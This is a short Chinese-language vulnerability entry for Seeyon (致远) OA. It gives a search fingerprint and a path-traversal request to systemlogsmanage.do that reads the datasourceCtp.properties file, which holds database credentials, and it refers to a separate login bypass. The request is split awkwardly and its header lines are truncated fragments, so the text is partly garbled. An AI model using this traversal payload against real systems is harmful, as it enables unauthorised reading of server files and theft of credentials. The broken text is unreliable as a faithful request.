# 致远OAsystemlogsmanage存在任意⽂件读取漏洞

致远OA ｜ 其他 ｜ —
- **指纹**：`app="致远互联-OA"`
- **请求**：`GET /seeyon/systemlogsmanage.do?method=seelogs&filename=../../../base/con`

**Payload**
```
需要先登录进后台（可以看先前发的登录绕过漏洞）
f/datasourceCtp.properties HTTP/1.1
Host:
(KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36
mage/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Cookie: JSESSIONID=6B0E1679E176576198C977802F3CA485; loginPageURL=""; avat
arImageUrl=-7273032013234748168
```
- **响应特征**：200